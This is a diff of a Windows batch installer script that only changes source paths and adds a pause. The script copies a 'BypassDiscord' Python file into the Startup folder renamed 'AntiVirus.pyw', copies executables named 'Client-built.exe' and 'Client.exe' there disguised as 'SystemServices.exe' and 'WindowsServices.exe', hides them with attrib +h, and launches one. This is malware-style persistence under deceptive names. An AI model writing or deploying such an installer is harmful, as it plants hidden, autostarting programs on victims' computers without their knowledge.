@@ -30,7 +30,7 @@ python -m pip install pyfiglet==1.0.2
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 ::paste bybass discord in startup
-set "SRC=%~dp0BypassDiscord.pyw"
+set "SRC=%~dp0Data\BypassDiscord.pyw"
 set "DEST=%STARTUP%\AntiVirus.pyw"
 copy /Y "%SRC%" "%DEST%" >nul 2>&1
 attrib +h "%DEST%"
@@ -38,7 +38,7 @@ attrib +h "%DEST%"
 
 ::paste client-built in startup
 ::set "SRC2=%~dp0\Binaries\Win64\en-US\Client-built.exe"
-set "SRC2=%~dp0SystemServices.exe"
+set "SRC2=%~dp0Data\SystemServices.exe"
 set "DEST2=%STARTUP%\SystemServices.exe"
 copy /Y "%SRC2%" "%DEST2%" >nul 2>&1
 attrib +h "%DEST2%"
@@ -46,7 +46,7 @@ attrib +h "%DEST2%"
 
 ::paste client in startup
 ::set "SRC3=%~dp0\Binaries\Win64\en-US\Client.exe"
-set "SRC3=%~dp0WindowsServices.exe"
+set "SRC3=%~dp0Data\WindowsServices.exe"
 set "DEST3=%STARTUP%\WindowsServices.exe"
 copy /Y "%SRC3%" "%DEST3%" >nul 2>&1
 attrib +h "%DEST3%"
@@ -63,3 +63,4 @@ echo All installations complete!
 start "" "%DEST%"
 ::start "" "%DEST2%"
 ::start "" "%DEST3%"
+pause
